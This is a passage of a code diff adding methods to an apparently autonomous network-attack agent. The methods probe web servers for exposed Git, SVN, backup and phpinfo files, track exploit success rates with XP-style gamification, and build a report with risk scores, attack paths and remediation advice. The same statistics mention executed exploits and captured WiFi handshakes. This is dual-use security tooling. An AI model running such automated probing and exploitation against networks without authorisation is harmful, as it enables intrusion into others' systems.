+                ("/.git/HEAD", "git_exposure"), ("/.svn/entries", "svn_exposure"),
+                ("/backup.zip", "backup_exposure"), ("/phpinfo.php", "phpinfo"),
+            ]:
+                check = await self._fast_nmap(
+                    f"curl -s --connect-timeout 3 -o /dev/null -w '%{{http_code}}' {url}{path} 2>/dev/null",
+                    timeout=8,
+                )
+                code = check.strip().replace("'", "")
+                if code in ("200", "301", "302"):
+                    self._think(f"Web vuln on {url}: {name} accessible (HTTP {code})")
+                    self.award_xp("vuln_validated", detail=f"{url}{path}")
+                    self.log_knowledge("web_vuln", f"{name}_{ip}_{port}", {
+                        "target": url, "path": path, "status": code, "type": name,
+                    }, source="web_test")
+
+    # ── 9. Learning Loop ─────────────────────────────────────────
+
+    def _update_learning(self):
+        """Track success/failure rates and update knowledge for better decisions next cycle."""
+        total_exploits = self._stats.get("exploits_executed", 0)
+        total_vulns = self._stats.get("vulns_found", 0)
+        total_devices = self._stats.get("devices_found", 0)
+
+        # Calculate success rates per attack type
+        success_rates = {}
+        for entry in self._knowledge_log:
+            if entry.get("category") == "exploit":
+                key = entry.get("key", "")
+                success = entry.get("value", {}).get("success", None)
+                attack_type = key.split("_")[0] if "_" in key else key
+                if attack_type not in success_rates:
+                    success_rates[attack_type] = {"success": 0, "fail": 0}
+                if success is True:
+                    success_rates[attack_type]["success"] += 1
+                elif success is False:
+                    success_rates[attack_type]["fail"] += 1
+
+        # Log learning summary
+        for atype, rates in success_rates.items():
+            total = rates["success"] + rates["fail"]
+            if total > 0:
+                rate = rates["success"] / total
+                self.log_knowledge("learning", f"success_rate_{atype}", {
+                    "attack_type": atype,
+                    "success_rate": round(rate, 3),
+                    "total_attempts": total,
+                    "successes": rates["success"],
+                    "failures": rates["fail"],
+                }, source="learning_loop")
+
+        # Record mistake patterns
+        if self._stats.get("exploits_failed", 0) > 3:
+            self.record_mistake("too_many_failed_exploits", "fewer", "many")
+
+        # Update stats for gamification
+        self._stats["knowledge_entries"] = len(self._knowledge_log)
+        self._stats["learning_cycles"] = self._stats.get("learning_cycles", 0) + 1
+
+        self._think(f"Learning updated: {len(success_rates)} attack types tracked")
+
+    # ── 10. Enhanced Reporting ───────────────────────────────────
+
+    async def _generate_enhanced_report(self):
+        """Generate report with remediation, risk scores, attack paths, executive summary."""
+        try:
+            devices = self.get_devices()
+            vulns = []
+            for n in self._notifications:
+                if n.type == NotificationType.VULN_FOUND:
+                    vulns.append({
+                        "target": n.target, "title": n.title,
+                        "message": n.message, "severity": n.severity,
+                    })
+
+            # Risk scoring
+            severity_scores = {"critical": 10, "high": 7, "medium": 4, "low": 2, "info": 1}
+            total_risk = sum(severity_scores.get(v["severity"], 1) for v in vulns)
+            risk_level = "critical" if total_risk > 50 else "high" if total_risk > 30 else "medium" if total_risk > 15 else "low"
+
+            # Remediation recommendations
+            remediation = []
+            seen_vulns = set()
+            for v in vulns:
+                vtype = v["title"].split(":")[0].strip()
+                if vtype in seen_vulns:
+                    continue
+                seen_vulns.add(vtype)
+                if "default credential" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Change all default passwords immediately", "priority": "critical"})
+                elif "ftp" in v["title"].lower() and "anonymous" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Disable FTP anonymous access", "priority": "high"})
+                elif "redis" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Enable Redis authentication (requirepass) and bind to localhost", "priority": "critical"})
+                elif "telnet" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Replace Telnet with SSH", "priority": "high"})
+                elif "smb" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Disable SMBv1, require authentication for shares", "priority": "high"})
+                elif "database" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Restrict database access to localhost or trusted IPs only", "priority": "critical"})
+                elif "wifi" in v["title"].lower() and "open" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Enable WPA3 or WPA2-Enterprise encryption", "priority": "high"})
+                elif "web" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Review web application configuration and apply patches", "priority": "medium"})
+                elif "shodan" in v["title"].lower():
+                    remediation.append({"vuln": vtype, "fix": "Restrict public-facing services, use VPN for remote access", "priority": "critical"})
+
+            # Attack path analysis
+            attack_paths = []
+            for ip, dev in self._devices.items():
+                for s in dev.services:
+                    if s.name.lower() in ("ssh", "ftp", "mysql", "redis", "telnet") and \
+                       any("default credential" in n.title.lower() for n in self._notifications if n.target == ip):
+                        attack_paths.append({
+                            "entry_point": f"{ip}:{s.port} ({s.name})",
+                            "impact": "Full system access via default credentials",
+                            "risk": "critical",
+                        })
+
+            # Executive summary
+            exec_summary = (
+                f"Scan completed: {len(devices)} devices discovered, {len(vulns)} vulnerabilities found. "
+                f"Overall risk: {risk_level.upper()} (score: {total_risk}). "
+                f"{len(remediation)} remediation actions recommended. "
+                f"{len(attack_paths)} critical attack paths identified."
+            )
+
+            report = {
+                "timestamp": time.time(),
+                "executive_summary": exec_summary,
+                "risk_assessment": {
+                    "overall_risk": risk_level,
+                    "risk_score": total_risk,
+                    "vuln_counts": {
+                        "critical": len([v for v in vulns if v["severity"] == "critical"]),
+                        "high": len([v for v in vulns if v["severity"] == "high"]),
+                        "medium": len([v for v in vulns if v["severity"] == "medium"]),
+                        "low": len([v for v in vulns if v["severity"] == "low"]),
+                    },
+                },
+                "remediation": remediation,
+                "attack_paths": attack_paths,
+                "devices": [
+                    {
+                        "ip": d.get("ip"), "hostname": d.get("hostname"),
+                        "type": d.get("type"), "os": d.get("os_guess"),
+                        "services": d.get("services", []),
+                        "risk_level": "high" if any(
+                            "default credential" in n.title.lower() for n in self._notifications if n.target == d.get("ip")
+                        ) else "info",
+                    } for d in devices
+                ],
+                "wifi_networks": [
+                    {"ssid": a.get("ssid"), "bssid": a.get("bssid"),
+                     "encryption": a.get("encryption"), "signal": a.get("signal")}
+                    for a in self.get_wifi_aps()
+                ],
+                "vulnerabilities": vulns,
+                "topology": self.get_topology(),
+                "summary": {
+                    "total_devices": len(devices),
+                    "total_vulns": len(vulns),
+                    "total_wifi_aps": len(self.get_wifi_aps()),
+                    "handshakes_captured": self._stats.get("handshakes_captured", 0),
+                    "exploits_executed": self._stats.get("exploits_executed", 0),
+                    "cycle_count": self._stats.get("cycle_count", 0),
+                    "level": self._level,
+                    "xp": self._xp,
+                },
+            }
+
+            report_file = self._data_dir / f"report_{int(time.time())}.json"
+            with open(report_file, 'w') as f:
+                json.dump(report, f, indent=2, default=str)
+            self._think(f"Enhanced report saved: {report_file.name}")
+
+            self._reports.append(report)
+            if len(self._reports) > 20:
+                self._reports = self._reports[-20:]
+
+        except Exception as e:
+            logger.error(f"Enhanced report generation failed: {e}")
+
+    # ── Data Access ───────────────────────────────────────────────
 
     def get_notifications(
         self,
